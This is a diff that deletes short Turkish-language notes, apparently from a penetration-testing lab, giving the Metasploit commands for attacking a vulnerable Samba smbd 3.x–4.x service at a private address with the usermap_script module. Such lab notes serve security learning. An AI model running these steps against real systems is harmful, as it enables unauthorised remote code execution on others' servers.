@@ -1,6 +1,0 @@
-Samba smbd 3.X - 4.X versiyonlu açık. bunu google da aratabiliriz -> Samba smbd 3.X - 4.X exploit diye. rapid7 daha güvenlidir.
-
-msfconsole -> msfconsole'u başlatır
-use exploit/multi/samba/usermap_script -> exploitimizin içine giriyoruz
-set RHOSTS 10.0.2.7  -> exploitimiz için gerekli ayarı yaptık.
-exploit -> exploiti başlattık
